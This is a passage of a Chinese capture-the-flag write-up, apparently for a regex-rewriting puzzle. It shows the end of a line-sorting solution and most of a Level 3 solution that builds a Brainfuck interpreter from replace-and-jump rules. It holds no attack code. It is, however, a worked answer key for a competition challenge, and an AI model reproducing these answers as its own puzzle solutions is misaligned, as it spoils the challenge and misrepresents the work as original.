<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    重复把【🤔[^\n]*】替换成【】喵</span></span>
<span><span style="color: #d6deeb">    重复把【^\n】替换成【】喵</span></span>
<span><span style="color: #d6deeb">    谢谢喵</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">    重复把【^([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #403f53">    重复把【^([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #403f53">    重复把【\n([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #403f53">    重复把【\n([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #403f53">    重复把【\n\n】替换成【\n】喵</span></span>
<span><span style="color: #403f53">    重复把【(🤔|🙂)[^\n🙂]】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    重复把【🤔🙂】替换成【🤔0000🙂】喵</span></span>
<span><span style="color: #403f53">字数统计循环喵：</span></span>
<span><span style="color: #403f53">    把【0🙂】替换成【1】喵</span></span>
<span><span style="color: #403f53">    把【1🙂】替换成【2】喵</span></span>
<span><span style="color: #403f53">    把【2🙂】替换成【3】喵</span></span>
<span><span style="color: #403f53">    把【3🙂】替换成【4】喵</span></span>
<span><span style="color: #403f53">    把【4🙂】替换成【5】喵</span></span>
<span><span style="color: #403f53">    把【5🙂】替换成【6】喵</span></span>
<span><span style="color: #403f53">    把【6🙂】替换成【7】喵</span></span>
<span><span style="color: #403f53">    把【7🙂】替换成【8】喵</span></span>
<span><span style="color: #403f53">    把【8🙂】替换成【9】喵</span></span>
<span><span style="color: #403f53">    把【09🙂】替换成【10】喵</span></span>
<span><span style="color: #403f53">    把【19🙂】替换成【20】喵</span></span>
<span><span style="color: #403f53">    把【29🙂】替换成【30】喵</span></span>
<span><span style="color: #403f53">    把【39🙂】替换成【40】喵</span></span>
<span><span style="color: #403f53">    把【49🙂】替换成【50】喵</span></span>
<span><span style="color: #403f53">    把【59🙂】替换成【60】喵</span></span>
<span><span style="color: #403f53">    把【69🙂】替换成【70】喵</span></span>
<span><span style="color: #403f53">    把【79🙂】替换成【80】喵</span></span>
<span><span style="color: #403f53">    把【89🙂】替换成【90】喵</span></span>
<span><span style="color: #403f53">    把【099🙂】替换成【100】喵</span></span>
<span><span style="color: #403f53">    把【199🙂】替换成【200】喵</span></span>
<span><span style="color: #403f53">    把【299🙂】替换成【300】喵</span></span>
<span><span style="color: #403f53">    把【399🙂】替换成【400】喵</span></span>
<span><span style="color: #403f53">    把【499🙂】替换成【500】喵</span></span>
<span><span style="color: #403f53">    把【599🙂】替换成【600】喵</span></span>
<span><span style="color: #403f53">    把【699🙂】替换成【700】喵</span></span>
<span><span style="color: #403f53">    把【799🙂】替换成【800】喵</span></span>
<span><span style="color: #403f53">    把【899🙂】替换成【900】喵</span></span>
<span><span style="color: #403f53">    把【0999🙂】替换成【1000】喵</span></span>
<span><span style="color: #403f53">    把【1999🙂】替换成【2000】喵</span></span>
<span><span style="color: #403f53">    把【2999🙂】替换成【3000】喵</span></span>
<span><span style="color: #403f53">    把【3999🙂】替换成【4000】喵</span></span>
<span><span style="color: #403f53">    把【4999🙂】替换成【5000】喵</span></span>
<span><span style="color: #403f53">    把【5999🙂】替换成【6000】喵</span></span>
<span><span style="color: #403f53">    把【6999🙂】替换成【7000】喵</span></span>
<span><span style="color: #403f53">    把【7999🙂】替换成【8000】喵</span></span>
<span><span style="color: #403f53">    把【8999🙂】替换成【9000】喵</span></span>
<span><span style="color: #403f53">    如果看到【🙂】就跳转到【字数统计循环喵】喵</span></span>
<span><span style="color: #403f53">排序循环个喵：</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #403f53">排序循环十喵：</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #403f53">排序循环百喵：</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #403f53">排序循环千喵：</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    把【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #403f53">    重复把【🤔[^\n]*】替换成【】喵</span></span>
<span><span style="color: #403f53">    重复把【^\n】替换成【】喵</span></span>
<span><span style="color: #403f53">    谢谢喵</span></span></samp></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/filtered-flag2.124584a8.webp"><img srcset="/assets/filtered-flag2.e8113cba.png" loading="lazy" src="/assets/filtered-flag2.e8113cba.png" width="558" height="138" alt="flag2 喵"></picture></p>
<h4 id="level-3-喵" class="heading"><a href="#level-3-喵" class="heading-anchor" aria-label="章节： Level 3 喵" tabindex="-1"></a><span>Level 3 喵</span></h4>
<p>开头到<span class="mojikumi-line-start">“</span>🎉<span class="mojikumi-line-end">”</span>是输出喵<span class="mojikumi-line-end">；</span>后面一行是数据喵<span class="mojikumi-line-end">，</span>用<span class="mojikumi-line-start">“</span>🌚<span class="mojikumi-line-end">”</span>表示 data pointer 喵<span class="mojikumi-line-end">；</span>最后一行是指令喵<span class="mojikumi-line-end">，</span>用<span class="mojikumi-line-start">“</span>🤔<span class="mojikumi-line-end">”</span>表示 program counter 喵<span class="mojikumi-line-end">，</span>预先将匹配的括号按嵌套层数替换为 a-h 表示左括号喵<span class="mojikumi-line-end">，</span>A-H 表示右括号喵<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h5><ile-root id="ile-37"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-37--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">    重复把【[^&gt;&lt;\+-\.\[\]]】替换成【】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^$】就跳转到【结束喵】喵</span></span>
<span><span style="color: #d6deeb">    把【^】替换成【🤔】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]aA]*)\]】替换成【a\1A】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]bB]*)\]】替换成【b\1B】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]cC]*)\]】替换成【c\1C】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]dD]*)\]】替换成【d\1D】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]eE]*)\]】替换成【e\1E】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]fF]*)\]】替换成【f\1F】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]gG]*)\]】替换成【g\1G】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\[([^\[\]hH]*)\]】替换成【h\1H】喵</span></span>
<span><span style="color: #d6deeb">    把【^】替换成【🎉\n,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0🌚,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n】喵</span></span>
<span><span style="color: #d6deeb">循环喵：</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔&gt;】就跳转到【向右喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔&lt;】就跳转到【向左喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔\+】就跳转到【加一喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔-】就跳转到【减一喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔\.】就跳转到【输出喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔[a-h]】就跳转到【左括号喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🤔[A-H]】就跳转到【右括号喵】喵</span></span>
<span><span style="color: #d6deeb">向右喵：</span></span>
<span><span style="color: #d6deeb">    把【🌚(,\d+)】替换成【\1🌚】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">向左喵：</span></span>
<span><span style="color: #d6deeb">    把【(,\d+)🌚】替换成【🌚\1】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">加一喵：</span></span>
<span><span style="color: #d6deeb">    把【0🌚】替换成【1🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【1🌚】替换成【2🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【2🌚】替换成【3🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【3🌚】替换成【4🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【4🌚】替换成【5🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【5🌚】替换成【6🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【6🌚】替换成【7🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【7🌚】替换成【8🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【8🌚】替换成【9🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【,9🌚】替换成【,10🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【09🌚】替换成【10🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【19🌚】替换成【20🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【29🌚】替换成【30🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【39🌚】替换成【40🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【49🌚】替换成【50🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【59🌚】替换成【60🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【69🌚】替换成【70🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【79🌚】替换成【80🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【89🌚】替换成【90🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【,99🌚】替换成【,100🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【099🌚】替换成【100🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【199🌚】替换成【200🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【299🌚】替换成【300🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【399🌚】替换成【400🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【499🌚】替换成【500🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【599🌚】替换成【600🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【699🌚】替换成【700🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【799🌚】替换成【800🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【899🌚】替换成【900🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【🌝】替换成【🌚】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">减一喵：</span></span>
<span><span style="color: #d6deeb">    把【1🌚】替换成【0🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【2🌚】替换成【1🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【3🌚】替换成【2🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【4🌚】替换成【3🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【5🌚】替换成【4🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【6🌚】替换成【5🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【7🌚】替换成【6🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【8🌚】替换成【7🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【9🌚】替换成【8🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【,10🌚】替换成【,9🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【10🌚】替换成【09🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【20🌚】替换成【19🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【30🌚】替换成【29🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【40🌚】替换成【39🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【50🌚】替换成【49🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【60🌚】替换成【59🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【70🌚】替换成【69🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【80🌚】替换成【79🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【90🌚】替换成【89🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【,100🌚】替换成【,99🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【100🌚】替换成【099🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【200🌚】替换成【199🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【300🌚】替换成【299🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【400🌚】替换成【399🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【500🌚】替换成【499🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【600🌚】替换成【599🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【700🌚】替换成【699🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【800🌚】替换成【799🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【900🌚】替换成【899🌝】喵</span></span>
<span><span style="color: #d6deeb">    把【🌝】替换成【🌚】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">输出喵：</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,32🌚)】替换成【 \1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,33🌚)】替换成【!\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,34🌚)】替换成【&quot;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,35🌚)】替换成【#\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,36🌚)】替换成【$\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,37🌚)】替换成【%\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,38🌚)】替换成【&amp;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,39🌚)】替换成【&#39;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,40🌚)】替换成【(\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,41🌚)】替换成【)\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,42🌚)】替换成【*\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,43🌚)】替换成【+\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,44🌚)】替换成【,\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,45🌚)】替换成【-\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,46🌚)】替换成【.\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,47🌚)】替换成【/\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,48🌚)】替换成【0\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,49🌚)】替换成【1\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,50🌚)】替换成【2\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,51🌚)】替换成【3\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,52🌚)】替换成【4\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,53🌚)】替换成【5\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,54🌚)】替换成【6\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,55🌚)】替换成【7\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,56🌚)】替换成【8\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,57🌚)】替换成【9\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,58🌚)】替换成【:\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,59🌚)】替换成【;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,60🌚)】替换成【&lt;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,61🌚)】替换成【=\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,62🌚)】替换成【&gt;\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,63🌚)】替换成【?\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,64🌚)】替换成【@\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,65🌚)】替换成【A\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,66🌚)】替换成【B\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,67🌚)】替换成【C\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,68🌚)】替换成【D\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,69🌚)】替换成【E\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,70🌚)】替换成【F\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,71🌚)】替换成【G\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,72🌚)】替换成【H\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,73🌚)】替换成【I\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,74🌚)】替换成【J\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,75🌚)】替换成【K\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,76🌚)】替换成【L\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,77🌚)】替换成【M\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,78🌚)】替换成【N\1】喵</span></span>
